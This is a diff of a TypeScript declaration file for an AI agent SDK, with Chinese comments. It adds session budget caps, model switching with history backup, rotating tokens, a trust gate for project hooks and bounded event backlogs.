+ * 系统文字转语音工具 = kernel TextToSpeech 骨架 + 平台提供方(name 'tansr')。计费副作用真实
  * 存在(按字符扣 App 余额)——骨架恒不声明只读/并发安全。
  */
 declare function createTextToSpeechTool(options: CreateTextToSpeechToolOptions): Tool<TextToSpeechArgs>;
@@ -22500,12 +23038,12 @@ declare function createTextToSpeechTool(options: CreateTextToSpeechToolOptions):
 /**
  * 平台音频直连客户端:
  * `session.platform.transcribe(...)` / `session.platform.speak(...)` 的实现件——
- * **纯 HTTP 客户端**,经令牌档材料(baseUrl / token / fetchImpl,与环3 工具的
+ * **纯 HTTP 客户端**,经令牌档材料(baseUrl / token / fetchImpl,与系统媒体工具的
  * PlatformToolContext 同源)直打 `POST {baseUrl}/t1/asr` / `POST {baseUrl}/t1/tts`,
  * **不进会话历史、不进事件流**(App 自决是否把转写文本作为下一条用户输入、是否
  * 把助手回复送去合成播放)。
  *
- * 为何与环3 工具并立:图像/视频只有工具链,因为它们是「智能体产出」;语音天然
+ * 为何与系统媒体工具并立:图像/视频只有工具链,因为它们是「智能体产出」;语音天然
  * 是**用户输入 / 助手输出的载体**——只有工具链会把「说一句话」变成一次智能体工具调用
  * (既慢又贵),直连是开发者需求优先的直接答案。
  *
@@ -22577,7 +23115,8 @@ declare class PlatformRequestError extends TansrSdkError {
     readonly status: number;
     readonly platformCode: string;
     readonly platformMessage: string;
-    constructor(face: PlatformAudioFace, status: number, platformCode: string, platformMessage: string, cause?: unknown);
+    readonly detail: Readonly<Record<string, number>> | undefined;
+    constructor(face: PlatformAudioFace, status: number, platformCode: string, platformMessage: string, cause?: unknown, detail?: unknown);
 }
 /** 网关往返结果(serve 代打径透传用;恒不 throw) */
 type PlatformAudioResponse = {
@@ -22608,6 +23147,7 @@ declare function requestPlatformAudio(options: RequestPlatformAudioOptions): Pro
 declare function platformErrorOf(body: unknown, status: number): {
     code: string;
     message: string;
+    detail?: Record<string, number>;
 };
 /** 令牌档直连客户端(createSession 令牌档在 AgentSession.platform 挂载;亦可独立构造) */
 declare function createPlatformAudioClient(options: CreatePlatformAudioClientOptions): PlatformAudioClient;
@@ -22661,6 +23201,124 @@ declare function sliceHistoryPage(messages: readonly IRMessage[], offset: number
  */
 declare function readHistoryPage(store: SessionStore, sessionId: string, options?: HistoryPageOptions): Promise<HistoryPage | null>;
 
+/** 会话模型、上下文预算与模型切换的可序列化状态。 */
+
+/** 模型身份及已知上下文窗口；未知窗口为 null，alias 保留调用者选择的别名。 */
+interface SessionModelState {
+    model: ResolvedModel;
+    alias: string | null;
+    contextWindowTokens: number | null;
+}
+/** 会话当前和下一轮的模型、最近观测用量及本地上下文预算快照。 */
+interface SessionContextState {
+    /** 下一轮将使用的模型；运行中的当前轮不会随此值改变。 */
+    selected: SessionModelState;
+    /** 当前运行轮冻结的模型；无运行轮时为 null。 */
+    active: SessionModelState | null;
+    lastObserved: {
+        model: ResolvedModel;
+        observedAt: number;
+        evidence: 'usage';
+    } | null;
+    lastUsage: {
+        usage: IRUsage;
+        model: ResolvedModel;
+        observedAt: number;
+    } | null;
+    /** 已观测到的 provider 切换，不据此推断未经确认的模型身份。 */
+    fallback: {
+        from: string;
+        to: string;
+        observedAt: number;
+    } | null;
+    budget: ContextBudgetState;
+    sampledAt: number;
+    history: 'live' | 'committed';
+    transition: {
+        status: 'idle' | 'preparing' | 'committing';
+        target: ResolvedModel | null;
+    };
+}
+/** 安全切换模型时的取消、时限、摘要调用上限和可选压缩配置。 */
+interface SwitchModelOptions {
+    signal?: AbortSignal;
+    timeoutMs?: number;
+    maxSummaryCalls?: number;
+    /** 显式重绑压缩配置，外置manager须与目标模型/客户端成对且窗口不越界。 */
+    compaction?: QueryCompactionOptions;
+}
+/** 模型切换结果；changed 表示迁移已提交，rejected 附拒绝原因及可用的备份标识。 */
+type SwitchModelResult = {
+    status: 'changed';
+    from: ResolvedModel;
+    to: ResolvedModel;
+    compacted: boolean;
+    summaryCalls: number;
+    checkpointId?: string;
+} | {
+    status: 'rejected';
+    reason: 'turn_running' | 'manager_incompatible' | 'cancelled' | 'checkpoint_failed' | 'persistence_failed' | 'persistence_rollback_failed' | 'target_window_unknown' | 'source_window_unknown' | 'input_too_large' | 'summary_failed' | 'target_budget_exceeded' | 'call_limit' | 'invalid_history';
+    checkpointId?: string;
+};
+/** 最近一次需摘要的迁移前完整原文，纯内存会话也保留；跟随会话生命周期。 */
+interface ModelTransitionBackup {
+    model: ResolvedModel;
+    messages: IRMessage[];
+    createdAt: number;
+    checkpointId?: string;
+}
+
+/**
+ * 会话预算闸装配(DEC-RF-29:TUI / headless / serve / acp / sdk 五形态读同一 `budget` 段形、走同一
+ * kernel RunQueryBudget 闸门语义)。
+ *
+ * - 段形 = protocol `BudgetSection`(配置层 `budget` 段:maxUsd / maxTotalTokens / onExceeded),与
+ *   `CreateSessionOptions.thinking.budget`(思考 token 预算,生成面旋钮)无关;
+ * - 消耗口径 = kernel `budgetSpendOf(snapshot)` 单点(RF-06;cli assembly/budget.ts / serve
+ *   platform-session-factory.ts 同源),快照来自本会话 CostTracker(消费会话事件流 `cost.usage.updated`,
+ *   含子代理 / 压缩摘要上卷);
+ * - 思考路逐行按该行 provider 能力位 `quirks.reasoningTokens` 在 tracker 记账期归账(RF-P3a;
+ *   托管 / 令牌档经 registry 合并产物,注入档回落 providers 内置能力表——与 `resolveImageInputMode` 同律);
+ * - 金额维:令牌档以 bundle 计价(`AssembledPlatformModel.pricingUpdates`)喂 `refreshed` 层价格簿,
+ *   `maxUsd` 自此对平台模型出数;托管 / 注入档为内置缺省簿(当前全 CNY → USD 桶恒 0,maxUsd 不设防,
+ *   币种无关兜底用 maxTotalTokens;cli 同限界);
+ * - 两上限皆缺席 = 不接闸、不建 tracker(与 serve 平台内置形同:零漂移)。
+ * 可观测面只走既有通道(DEC-RF-48):block → `turn.aborted{reason:'budget_exceeded'}`,warn → 每次查询
+ * 至多一条 `turn.error{scope:'budget', recoverable:true}`;不新增事件类型 / 字段。
+ */
+
+/**
+ * 会话预算(`createSession({ budget })`):会话累计消耗触顶时的处置。
+ * 字段与配置文件 `budget` 段同形(`tansr` 命令行的 TUI / headless / serve / acp 读的是同一段);
+ * 与 `thinking.budget`(单轮思考 token 预算)无关。
+ * 两个上限都缺席时不接闸门(等价于不传)。
+ */
+interface SessionBudgetOptions {
+    /**
+     * 会话 USD 金额上限(美元,正数)。比对口径 = 会话成本总账中 USD 币种桶的累计;只有以 USD 计价的模型
+     * (令牌档按平台 bundle 计价)会进入该口径——非 USD 计价与缺价模型不折算、不设防,币种无关的兜底请用
+     * `maxTotalTokens`。
+     */
+    maxUsd?: number;
+    /** 会话 token 总量上限(正整数):输入 + 输出 + 缓存读 + 缓存写(思考 token 按各模型能力位并入输出,不重复计) */
+    maxTotalTokens?: number;
+    /**
+     * 触顶动作。`'block'`(缺省):下一次模型调用前终止本轮,事件流出 `turn.aborted { reason: 'budget_exceeded' }`,
+     * 会话保持打开,后续轮同样被拦;`'warn'`:每次查询至多一条 `turn.error { scope: 'budget', recoverable: true }`
+     * 后照常继续。已发出的模型流 / 工具调用不会被中途截断。
+     */
+    onExceeded?: BudgetSection['onExceeded'];
+}
+/**
+ * 装配产物:会话账本入流口 + kernel 闸门选项(逐轮透传 runQuery.budget)。
+ * 只暴露 consume 缝、不暴露账本类型:公开 d.ts 不因内部接线卷入 kernel 成本模块声明。
+ */
+interface SessionBudgetWiring {
+    /** 会话事件旁路记账(`cost.usage.updated` 逐行入账;其余事件忽略) */
+    consume(event: KernelEvent): void;
+    option: RunQueryBudget;
+}
+
 /**
  * `createSession` 的选项。三档模型来源互斥:令牌档(`token` + `baseUrl`,模型与能力位由平台 bundle 供给)/
  * 托管档(`model` 为别名字符串,五层配置装配)/ 注入档(`client` + `model` 对象,零配置零 IO);
@@ -22686,8 +23344,10 @@ interface CreateSessionOptions {
      * app_user 短期令牌(开发者服务端换发;终端分发形态)。在场即令牌档:
      * 模型与能力位由平台 bundle 供给,恒零本地配置 IO(config/loadOptions/
      * capabilities 均不可同给)。
+     * 亦可传 getter(`() => currentToken`):每个平台请求(bundle / heartbeat、模型直连、媒体工具、
+     * `session.platform` 直连、提示词刷新)发起时取现值,令牌轮换后无需重建会话;getter 须回非空字符串。
      */
-    token?: string;
+    token?: string | (() => string);
     /** 平台 API 基址(令牌档必填,如 https://api.example.com) */
     baseUrl?: string;
     /**
@@ -22722,6 +23382,21 @@ interface CreateSessionOptions {
     config?: LoadedConfig;
     /** loadConfig 其余注入缝(fs/homedir/platform;测试 hermetic 用) */
     loadOptions?: Omit<LoadConfigOptions, 'cwd' | 'env'>;
+    /**
+     * 项目层 hooks 信任门(托管档)。缺席 / false = 工作区 `.tansr/settings.json` 与 `settings.local.json`
+     * 声明的 command / http hooks 不启用、零执行、零 `hook.*` 事件(user 层 / managed 层 hooks 照常);
+     * true = 宿主代表用户为该工作区授信,项目层 hooks 照跑。SDK 不持久化信任、不读取命令行工具的工作区
+     * 信任记录——是否授信由宿主自行向用户确认并逐次传入。门住的项目层 hooks 在场时通报一次
+     * `project_hooks_untrusted`(`onWarning`;缺席回落事件流 `turn.error{scope:'sdk.notice', recoverable:true}`)。
+     * 注入 / 令牌档无配置 hooks,本项无效。
+     */
+    trustProjectHooks?: boolean;
+    /**
+     * 权限引擎 Shell 命令词法方言(kernel `HostShell`:'posix' | 'powershell')。缺席随平台(kernel
+     * `detectHostShell()`,与内置 Shell 工具实际派生的 shell 一致);显式值供测试或跨平台装配演练——与真实
+     * 执行 shell 错配会让 Shell 命令词法守卫与执行环境脱节,生产宿主不应设置。三档皆生效。
+     */
+    hostShell?: HostShell;
     /**
      * 三环工具入口:builtin(环2 内置,词表逐名)/ platform(环3 平台能力,现只校验位)/ custom
      * (环1 defineTool 产物)。缺席 = 装配能力位放行的全部内置工具;`tools: { builtin: [] }` = 零内置。
@@ -22764,12 +23439,29 @@ interface CreateSessionOptions {
     thinking?: {
         budget?: number;
     };
+    /**
+     * 会话预算闸(与 `thinking.budget` 无关):会话累计消耗(USD 金额 / token 总量)触顶时按 `onExceeded`
+     * 处置——缺省 `'block'` 在下一次模型调用前终止本轮(`turn.aborted { reason: 'budget_exceeded' }`,会话保持打开),
+     * `'warn'` 每次查询至多一条 `turn.error { scope: 'budget' }` 后继续。字段与配置文件 `budget` 段同形,
+     * `tansr` 命令行各形态(TUI / headless / serve / acp)与 SDK 读同一段、同一闸门语义。两个上限都缺席 = 不接闸。
+     * 金额维只对以 USD 计价的模型出数(令牌档按平台 bundle 计价);其余档请用 `maxTotalTokens`。
+     */
+    budget?: SessionBudgetOptions;
     /** 单轮 modelTurns 护栏;缺省 200(与 serve 对齐) */
     maxTurnsPerQuery?: number;
     /** 缺省 randomUUID() */
     sessionId?: string;
     /** 会话级中断信号:abort 即 close(运行中轮先优雅中止,尾部事件不丢) */
     signal?: AbortSignal;
+    /**
+     * 事件流积压上界(首订阅者到来前保留的事件条数 / 近似字节;缺省 1000 条 / 2 MiB)。超界丢最旧、
+     * 队首以恰一条 `session.events_dropped{scope:'sdk.events', droppedCount, reason}` 通报丢弃计数与原因
+     * (contract-v0.27,RFC-RF-1);上界以内首订阅者仍收全量积压。取值须为正数(可为 Infinity),否则 invalid_options。
+     */
+    events?: {
+        maxBacklogEvents?: number;
+        maxBacklogBytes?: number;
+    };
     /**
      * 上下文压缩(kernel 自动压缩):缺省 {}(自动压缩,仅上下文窗口已知的轮生效——阈值代数依赖窗口,
      * 与 TUI/serve 同守卫);false 显式禁用。
@@ -22991,6 +23683,7 @@ interface SetModelBinding {
 /** AgentSession 构造参数(createSession 装配产物;不对外) */
 interface AgentSessionInit {
     binding: ModelBinding;
+    modelAlias?: string;
     executor: ToolExecutor;
     system: IRSystemSegment[];
     applicationPrompt?: ApplicationPromptInfo;
@@ -23035,11 +23728,28 @@ interface AgentSessionInit {
     /** 会话存储(fork() 安放新会话记录;缺席 = fork() 抛 session_store_not_wired) */
     store?: SessionStore;
     /**
-     * 令牌档平台直连材料(与环3 工具 PlatformToolContext 同源:baseUrl / token / fetchImpl);
+     * 令牌档平台直连材料(与系统工具的平台提供方 PlatformToolContext 同源:baseUrl / token / fetchImpl);
      * 在场即挂载 session.platform 直连客户端,缺席(托管/注入档)= fail-fast 占位
      * (调用即 invalid_options 指引令牌档,imageGen 工具选择同律)。
      */
     platformContext?: PlatformToolContext;
+    /** 「从未有订阅者」积压的条数 / 近似字节上界(createSession 已校验;缺省见 DEFAULT_EVENT_BACKLOG) */
+    eventBacklog: {
+        maxEvents: number;
+        maxBytes: number;
+    };
+    /**
+     * 装配层合成事件的入流口回填——构造期把类内私有入流方法交给 createSession 的闭包
+     * (hooks emit / 告警 notice / session.forked),模块外不再依赖公开方法。
+     */
+    bindEmit?: (emit: (body: EventBody, source: string) => void) => void;
+    /** 会话级中断信号:abort → close;监听在 close 时解除。已 aborted 的信号由 createSession 直接 close */
+    signal?: AbortSignal;
+    /**
+     * 会话预算闸接线(createSession 由 `budget` 选项装配;缺席 = 不接闸、不建账本):`consume` 旁路记账本会话
+     * 全部入流事件(内核事件 + 装配层合成的 cost.usage.updated),`option` 逐轮透传 runQuery.budget。
+     */
+    budget?: SessionBudgetWiring;
 }
 /**
  * 多轮会话句柄(纯 headless,无 UI;由 `createSession` 创建)。`send()` 提交输入(空闲起新轮,运行中经注入
@@ -23065,10 +23775,23 @@ declare class AgentSession {
      * 独立订阅者:SessionView 泵、Narrator、宿主自建循环可同时挂,各得全量事件、互不争抢;
      * 首订阅者收到会话创建以来的积压,晚订阅者自订阅点起。跨轮连续,close() 后以
      * session.ended 收尾并正常终结(各订阅者排空后 for-await 自然退出)。
+     *
+     * 积压有界:首订阅者到来前的积压受 `CreateSessionOptions.events` 的条数 / 近似字节
+     * 上界约束(缺省 1000 条 / 2 MiB),超界丢最旧并以恰一条 `session.events_dropped{scope:'sdk.events',
+     * droppedCount, reason, …}` 占队首通报(contract-v0.27);上界以内全量积压照旧。
+     * 直播后订阅者全部离场期间推送的事件不保留(晚订阅者自当前起,既有语义)。
      */
     get events(): AsyncIterable<KernelEvent>;
-    /** 当前模型档快照 */
-    currentModel(): ResolvedModel;
+    /** 下轮模型档快照；active=true 优先取本轮冻结绑定，空闲时取下轮档。 */
+    currentModel(options?: {
+        active?: boolean;
+    }): ResolvedModel;
+    /** 即时快照：在飞执行/下轮选择与已观察模型分开，token占用恒非累计计费量。 */
+    contextState(): SessionContextState;
+    /** 首次同步通知；返回函数解除订阅。观察器失败不影响会话。 */
+    subscribeContext(listener: (state: SessionContextState) => void): () => void;
+    /** 最近一次迁移前原文深拷贝；摘要有损，原件可另行导出/恢复。 */
+    modelTransitionBackup(): ModelTransitionBackup | null;
     running(): boolean;
     inputCapabilities(): SessionInputCapabilities;
     getInputTarget(): SessionInputTarget | null;
@@ -23091,7 +23814,9 @@ declare class AgentSession {
      * 结构化 throw(不静默吞输入)。
      */
     send(prompt: string): void;
-    /** 中断当前轮(优雅:事件流走到 turn.aborted);空闲/已关闭为无害空操作 */
+    /** 图文仅从空闲起新轮；拒绝时零消费，宿主保留原草稿后重试。 */
+    sendBlocks(input: readonly SessionUserBlock[]): SendBlocksResult;
+    /** 中断当前轮(优雅:事件流走到 turn.aborted);空闲为无害空操作;已关闭 → session_closed(全表同律) */
     interrupt(): void;
     /**
      * 模型切换(对后续轮生效;运行中轮不受影响):
@@ -23099,12 +23824,18 @@ declare class AgentSession {
      *   (解析失败抛 TansrSdkError('assembly_failed'),会话状态不变);
      * - SetModelBinding:client 与 model 成对更换(跨 provider 时旧 client
      *   不可复用);contextWindowTokens 不传则清空(宁缺毋错)。
+     * 已关闭会话上调用 → session_closed(先于别名解析:不构造任何新 client,currentModel() 不变)。
      */
     setModel(next: string | SetModelBinding): void;
     /**
+     * 空闲期安全切模：完整备份→源窗/分段摘要→目标预算验证→持久化→原子提交。
+     * 无store时保留内存原文；失败/取消不切模型、不换历史。新输入沿idle操作队列缓冲。
+     */
+    switchModel(next: string | SetModelBinding, options?: SwitchModelOptions): Promise<SwitchModelResult>;
+    /**
      * 动态切换思考生成(生成面旋钮,setModel 同形制):下一轮生效,运行中轮
      * 不受影响。undefined = 回到不注入(模型缺省);呈现面(思考显示与否)
-     * 走 SessionView delivery,两旋钮正交互不推导。
+     * 走 SessionView delivery,两旋钮正交互不推导。已关闭会话上调用 → session_closed。
      */
     setThinking(thinking: {
         budget?: number;
@@ -23112,6 +23843,7 @@ declare class AgentSession {
     /**
      * 关闭会话(幂等):空闲立即收口(session.ended + 流终结);运行中先
      * abort,收口推迟到泵终态——中止轮的尾部事件(turn.aborted 等)不丢失。
+     * 会话级 signal 的 abort 监听在此解除(逻辑 close 后 abort 已无事可做,不再为已关闭会话持有闭包)。
      */
     close(): void;
     /** 排空当前轮(含结转连锁起的新轮)与空闲期操作链:close/断言前等待终态收口 */
@@ -23174,11 +23906,6 @@ declare class AgentSession {
      * 并发造成共享附件误删);运行中的轮不受影响(本方法不触历史,链内不校验 turn_running)。
      */
     importCheckpoint(bytes: Uint8Array, options?: ImportCheckpointOptions): Promise<CheckpointMeta>;
-    /**
-     * 装配层合成事件入流(hooks emit / provider 切换 / todo 台账):包络本地
-     * 补齐,seq 与内核事件共用同一会话计数器。内部使用;不属公开 API 面。
-     */
-    pushBody(body: EventBody, source: string): void;
     /** 等查询生成器实际收尾与提交；不得从本会话 history callback 内调用并等待。 */
     drain(options?: SessionDrainOptions): Promise<SessionDrainResult>;
     /** 信号/超时仅约束观察，逻辑 close 仍即时生效；非法选项在 close 前拒绝。 */
@@ -23203,6 +23930,28 @@ declare class AgentSession {
  * 装配失败以 TansrSdkError 结构化抛出(不 process.exit)。
  */
 declare function createSession(options?: CreateSessionOptions): Promise<AgentSession>;
+
+/** 应用提示词刷新失败的稳定原因分类，可用于区分凭据、权限、网络及配置问题。 */
+type ApplicationPromptFailureReason = 'authentication' | 'authorization' | 'rate_limit' | 'unavailable' | 'network' | 'timeout' | 'invalid_config' | 'cancelled' | 'unknown';
+/** 失败后的建议恢复动作；由宿主决定何时执行，不会自动续期或重放请求。 */
+type ApplicationPromptRetry = 'renew_credentials' | 'sign_in' | 'check_permissions' | 'retry_later' | 'retry' | 'check_configuration' | 'none';
+/** 可安全投影到事件/界面的事实；不含地址、原始响应、令牌或异常堆栈。 */
+interface ApplicationPromptFailure {
+    stage: 'app_config' | 'credential_refresh' | 'turn_start';
+    reason: ApplicationPromptFailureReason;
+    retry: ApplicationPromptRetry;
+    status?: number;
+}
+/** 应用配置请求失败，附带可向用户展示的原因、HTTP 状态及恢复建议。 */
+declare class AppConfigRequestError extends TansrSdkError {
+    /** 不含凭据及响应正文的只读错误详情。 */
+    readonly failure: Readonly<ApplicationPromptFailure>;
+    constructor(failure: ApplicationPromptFailure, options?: ErrorOptions);
+}
+/** 从有限层 cause 及约定字段提取提示词刷新失败的安全信息，不转发错误正文。 */
+declare function describeApplicationPromptFailure(error: unknown): ApplicationPromptFailure;
+/** 终端文案走共享语言包；失败类别与恢复建议分别有稳定字段供宿主自行渲染。 */
+declare function applicationPromptFailureMessage(error: unknown): string;
 
 /** `createFileSessionStore` 的选项:存储根目录 + 可选封段阈值、冷层分层存储与可观测回调 */
 interface CreateFileSessionStoreOptions {
@@ -23413,18 +24162,22 @@ interface ErrorView {
     readonly detail?: Record<string, unknown>;
 }
 /**
- * 咨询通报:`turn.error{recoverable:true}` 的归约形——kernel 的
- * 咨询帧(压缩熔断暂停 / sdk.notice 弃用提示 / sdk.persistence 落卷失败 / serve store_commit_failed …)
- * 不是失败,归 `notices` 而不污染 lastError。字段恒自 wire 派生,不发明词:
+ * 咨询通报:`turn.error{recoverable:true}` 与 `session.events_dropped`(contract-v0.27,RFC-RF-1)的归约形——
+ * kernel 的咨询帧(压缩熔断暂停 / sdk.notice 弃用提示 / sdk.persistence 落卷失败 / serve store_commit_failed …)
+ * 与 sdk 事件积压溢出通报都不是失败,归 `notices` 而不污染 lastError。字段恒自 wire 派生,不发明词:
  * - seq / at = 事件包络 seq / ts;
- * - code = errorKind,errorKind 缺席回落 scope;
- * - detail = `turn.error.detail` 透传(首个取值套餐配额 `{ scope: 'plan' }`);缺席即键缺席。
+ * - code = errorKind,errorKind 缺席回落 scope;`session.events_dropped` 归约 code = 事件 type;
+ * - message = `turn.error.message`;零文本事件(`session.events_dropped`)**不落键**——宿主按 `code` 渲染、
+ *   `message` 仅作兜底(0.14.0 起可选,DEC-RF-20 QA-RFC-02 (b));
+ * - detail = `turn.error.detail` 透传(首个取值套餐配额 `{ scope: 'plan' }`)/ `session.events_dropped` 载荷去
+ *   type、scope 后的余键(`{ droppedCount, reason, droppedBytes?, firstDroppedSeq?, lastDroppedSeq?, maxEvents?, maxBytes? }`);
+ *   缺席即键缺席。
  */
 interface SessionNotice {
     readonly seq: number;
     readonly scope: string;
     readonly code: string;
-    readonly message: string;
+    readonly message?: string;
     readonly at: number;
     readonly detail?: unknown;
 }
@@ -23653,7 +24406,7 @@ type CreateImageGenToolOptions = CreatePlatformImageGenProviderOptions & {
     token: string;
 };
 /**
- * 环3 平台图像生成工具 = kernel ImageGen 骨架 + 平台提供方(name 'tansr')。计费副作用真实存在
+ * 系统图像生成工具 = kernel ImageGen 骨架 + 平台提供方(name 'tansr')。计费副作用真实存在
  * (按张扣 App 余额)——骨架恒不声明只读/并发安全。
  */
 declare function createImageGenTool(options: CreateImageGenToolOptions): Tool<ImageGenArgs>;
@@ -23675,7 +24428,7 @@ type CreateVideoGenToolOptions = CreatePlatformVideoGenProviderOptions & {
     token: string;
 };
 /**
- * 环3 平台视频生成工具 = kernel VideoGen 骨架 + 平台提供方(name 'tansr')。计费副作用真实存在
+ * 系统视频生成工具 = kernel VideoGen 骨架 + 平台提供方(name 'tansr')。计费副作用真实存在
  * (按秒扣 App 余额,分钟级长任务)——骨架恒不声明只读/并发安全。
  */
 declare function createVideoGenTool(options: CreateVideoGenToolOptions): Tool<VideoGenArgs>;
@@ -23877,7 +24630,7 @@ interface ApplicationPromptTurnOptions {
     prepare: (signal: AbortSignal) => Promise<IRSystemSegment[]>;
     /** 每轮最多调用一次；此后工具循环始终消费该轮选定的 system。 */
     start: (system: IRSystemSegment[]) => QueryHandle;
-    errorMessage: (error: unknown) => string;
+    errorMessage?: (error: unknown) => string;
     errorScope?: string;
     /** 预检绝对上限，缺省30秒；即使自定义fetch忽略取消，也能收束本轮。 */
     prepareTimeoutMs?: number;
@@ -23905,5 +24658,5 @@ declare function createApplicationPromptRefresher(options: {
     etag?: string;
 }): (signal: AbortSignal) => Promise<ApplicationPromptSnapshot>;
 
-export { ADJUDICATION_CONSULT_TOKEN_ESTIMATE, ADJUDICATION_POSTURES, ADJUDICATOR_TIERS, ADJUDICATOR_UNAVAILABLE_WARNING, APP_PLATFORMS, APP_PLATFORM_TOPOLOGY, APP_SDK_CONTRACT_VERSION, APP_SINGLE_STAGE_INSTRUCTION, APP_SINGLE_STAGE_PROTOCOL_FINGERPRINT, APP_TOKEN_PLACEHOLDER_ENV, APP_TOKEN_PLACEHOLDER_VALUE, APP_TOKEN_REJECT_REASONS, APP_TOKEN_TRANSIENT_REASONS, AdjudicatorTierSchema, AgentSession, AppBundlePlanSchema, AppCapabilitiesSchema, AppPlatformSchema, AppTokenRequestSchema, AppTokenResponseSchema, CAPABILITY_BIT_TOOL_NAMES, CAPABILITY_PLATFORM_KEYS, CAPABILITY_TOOL_KEYS, CAPABILITY_TOPOLOGIES, CHECKPOINT_EXPORT_FORMAT, CLASSIFIER_PROTOCOL_FINGERPRINT, CLASSIFIER_TIMEOUT_POLICY, CLIENT_FEATURES, DEFAULT_APP_CAPABILITIES, DEFAULT_BUNDLE_CACHE_SCOPE, DEFAULT_BUNDLE_CACHE_TTL_MS, DEFAULT_MAX_TOKENS, DEFAULT_MAX_TURNS, DEVELOPER_ONLY_ADJUDICATOR_WARNING_CODES, EndUserIdSchema, HEADER_APP_TOKEN, HEADER_CLIENT_FEATURES, IMAGEGEN_TOOL_MAX_N, IMAGEGEN_TOOL_TIMEOUT_MS, ImageGenArgsSchema, ImageGenDataSchema, LOCAL_END_USER_KEY, McpHost, OUTPUT_TAIL_MAX_CHARS, PLAN_ERROR_CODES, PLAN_ERROR_HTTP_STATUS, PLAN_STATUSES, PLAN_TIERS, PLATFORM_MEDIA_PROVIDER_NAME, PLATFORM_SEARCH_PROVIDER_NAME, PlanCapsSchema, PlanStatusSchema, PlanTierSchema, PlatformRequestError, QueueChannel, SEGMENTED_STORE_DEFAULTS, SESSION_NOTICES_MAX, SINGLE_STAGE_PROTOCOL_FINGERPRINT, SPEECH_TO_TEXT_TOOL_TIMEOUT_MS, SdkLifecycleError, SequentialToolExecutor, SpeechAudioSchema, SpeechDataSchema, SpeechToTextArgsSchema, StoreError, TANSR_PROVIDER_ID, TEXT_TO_SPEECH_DEFAULT_MAX_CHARS, TEXT_TO_SPEECH_FORMATS, TEXT_TO_SPEECH_TOOL_TIMEOUT_MS, TOKEN_INVALIDATING_CODES, TOOLS_PLATFORM_DEPRECATED_CODE, TOOL_GUIDE_LABEL, TWO_STAGE_TIMEOUT_MS, TansrSdkError, TextToSpeechArgsSchema, TranscriptDataSchema, TranscriptSegmentSchema, UnavailableChannel, VIDEOGEN_TOOL_MAX_DURATION, VIDEOGEN_TOOL_TIMEOUT_MS, VideoGenArgsSchema, VideoGenDataSchema, accumulateUsage, alignHistoryPage, appBundlePricingUpdates, appBundleRegistryConfig, appSingleStageProtocolFingerprintFor, appendUserMessage, assembleBundleAdjudicator, assembleManagedModel, assemblePlatformModel, assembleSdkSkills, assembleTokenTierAdjudicator, assembleTooling, attachSdkMcp, attachSdkMcpWithDiscover, attachSdkTaskTool, buildClientFromRegistry, buildSdkToolSet, buildToolGuideSegment, bundleKey, classifierProtocolFingerprintFor, createAppTokenFetch, createApplicationPromptRefresher, createBlockListClassifier, createBundleCache, createChaosBlobStore, createClassifierTranscriptRecorder, createFileCheckpointStore, createFileSessionStore, createFsBlobStore, createImageGenTool, createMcpHost, createMemoryBlobStore, createNarrator, createPlatformAudioClient, createPlatformImageGenProvider, createPlatformSearchProvider, createPlatformSpeechToTextProvider, createPlatformTextToSpeechProvider, createPlatformVideoGenProvider, createSdkPermissionGate, createSession, createSessionView, createSingleStageClassifier, createSpeechToTextTool, createTextToSpeechTool, createTwoStageClassifier, createUnavailablePlatformAudioClient, createVideoGenTool, defaultAppCapabilities, defineSkill, defineTool, featuresFingerprintOf, fetchAppBundle, fetchTwpFeatures, fetchTwpHeartbeat, hintFor, hostedToolUniverse, inapplicableTrueBits, initialSessionViewState, isPlanErrorCode, isRenderableArtifact, isSessionHistoryStore, isTokenInvalidatingCode, isTransientAppTokenReason, markSourceFailure, normalizeAppCapabilitiesForPlatform, normalizeEtagValue, parseAppBundle, parseCacheControlMaxAgeMs, parseMediaArtifact, parseSpeechData, parseStage1Output, parseStage2Output, parseTranscriptData, planErrorGuidance, planUpgradeUrlOf, platformErrorOf, prepareAdjudication, prepareApplicationPromptTurn, providerSwitchedBody, query, readHistoryPage, reduceSessionView, renderAppContext, renderCallPayloadDetailed, renderClassifierStagePrompt, renderEngineFacts, requestPlatformAudio, resolveAdjudicationPosture, resolveAdjudicatorGovernance, resolveApplicationSystem, resolveBuiltinSelection, resolveInitialMessages, resolvePlatformSelection, resolveStageHandle, runAgent, runIdleCompaction, runStorageConformance, serializeTimeoutPolicy, setSessionViewDelivery, singleStageProtocolFingerprintFor, sliceHistoryPage, stripThinkingParts, subagentModelResolverOf, toStoreError, toToolDef, topologyOf, topologyToolUniverse, validateAdjudicationOptions, viewStateFromHistory, zeroAppCapabilities };
-export type { ActiveToolStatus, AdjudicationOptions, AdjudicationPosture, AdjudicationWarning, AdjudicatorGovernance, AdjudicatorGovernanceInput, AdjudicatorMoneyFold, AdjudicatorTier, AlignedHistoryPage, Answer, AppBundle, AppBundleAdjudicator, AppBundleContextScheme, AppBundleGovernance, AppBundleImageModel, AppBundleMediaModel, AppBundleModel, AppBundleModelPricing, AppBundlePlan, AppBundlePlatformModels, AppBundleSpeechToTextModel, AppBundleTextToSpeechModel, AppBundleVideoModel, AppCapabilities, AppPlatform, AppTokenRejectReason, AppTokenRequest, AppTokenResponse, ApplicationPromptInfo, ApplicationPromptSnapshot, ApplicationPromptTurnOptions, AskUserCallback, AssembleBundleAdjudicatorOptions, AssembleManagedModelOptions, AssemblePlatformModelOptions, AssembleToolingAdjudication, AssembleToolingOptions, AssembledBundleAdjudicator, AssembledManagedModel, AssembledPlatformModel, AssembledSkills, AssembledTooling, AttachSdkTaskToolConfig, AudioAsrConstraints, AudioTtsConstraints, BlobListEntry, BlobMeta, BlobStoreCapabilities, BlockListClassifierConfig, BuildSdkToolSetOptions, BuiltinToolName, BundleCache, BundleCacheKey, BundleCacheResolveInput, BundleCacheScope, BundleCacheStats, ByteRange, Capability, CapabilityPlatformKey, CapabilityToolKey, CapabilityTopology, CapabilityTopologyProfile, ChaosBlobStore, ChaosFaults, ChaosStats, Checkpoint, CheckpointInput, CheckpointMeta, CheckpointOptions, CheckpointRetention, CheckpointStore, CheckpointTrigger, ClassifierAssemblyMode, ClassifierLiveStages, ClassifierProtocol, ClassifierStageBudgetOverrides, ClassifierStageHandle, ClassifierTimeoutPolicy, ClassifierTranscriptRecorder, ClientFeature, StoredSessionMeta as ColdStoredSessionMeta, ColdTierEvent, ColdTierEventType, ColdTierStats, CompactNowOptions, CompactNowResult, CompactOptions, CompactResult, CompactionFailureReason, ConfigDiagnostic, CreateBlockListClassifierOptions, CreateBundleCacheOptions, CreateFileCheckpointStoreOptions, CreateFileSessionStoreOptions, CreateImageGenToolOptions, CreatePlatformAudioClientOptions, 